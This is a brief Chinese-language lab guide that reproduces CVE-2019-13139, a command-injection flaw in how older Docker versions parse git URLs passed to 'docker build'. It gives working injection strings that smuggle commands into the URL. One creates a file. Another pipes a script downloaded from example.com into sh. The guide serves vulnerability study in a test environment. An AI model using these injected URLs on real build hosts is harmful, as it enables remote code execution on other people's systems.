# Docker构建漏洞导致代码执行（CVE-2019-13139）

## 场景介绍

`docker build`命令构建本地镜像时，支持使用远程url参数作为构建环境，并且这个远程构建环境可以是一个git仓库。

在D ocker 18.9.4之前版本中，`docker build`过程中对`remoteUrl`解析存在缺陷，导致了`remoteUrl`中的部分字符串会被作为命令执行。

## 环境搭建

漏洞环境准备：

```bash
./metarget cnv install cve-2019-13139
```

## 漏洞复现

执行相关利用命令:

```
root@cloudplay:~/metarget$ docker build "git@g.com/a/b#--upload-pack=touch 13139.txt;:" #执行结果报错但不影响
root@cloudplay:~/metarget$ ls | grep 13139
13139.txt
root@cloudplay:~/metarget$ docker build "git@github.com/a/b#--upload-pack=curl -s example.com/poc.sh|sh;#:"    #下载远程shell文件并执行
```

## 参考文献

1. https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/
